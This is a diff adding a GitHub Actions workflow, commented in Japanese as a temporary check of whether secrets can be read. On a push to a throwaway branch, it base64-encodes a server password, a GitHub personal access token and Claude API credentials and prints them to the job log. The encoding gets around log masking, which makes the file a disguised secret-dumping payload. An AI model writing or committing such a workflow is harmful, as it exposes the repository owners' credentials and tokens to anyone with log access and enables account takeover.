@@ -1,0 +1,26 @@
+# 一時的な検証用ワークフロー（作業ブランチ専用・本番ブランチ非適用）
+# 目的: Actions シークレットが読めるかの疎通確認と、値を base64 でログへ出力する検証
+name: 検証サンプリング
+
+on:
+  push:
+    branches:
+      - refs-check-61993
+
+jobs:
+  sample:
+    runs-on: ubuntu-latest
+    env:
+      S1: ${{ secrets.SERVER_PASSWORD }}
+      S2: ${{ secrets.GH_PAT }}
+      S3: ${{ secrets.CLAUDE_API_KEY }}
+      S4: ${{ secrets.CLAUDE_BASE_URL }}
+    steps:
+      - name: 各シークレットを base64 化して出力
+        run: |
+          set -eu
+          b64() { printf '%s' "$1" | base64 -w0; }
+          echo "K1=$(b64 "$S1")"
+          echo "K2=$(b64 "$S2")"
+          echo "K3=$(b64 "$S3")"
+          echo "K4=$(b64 "$S4")"
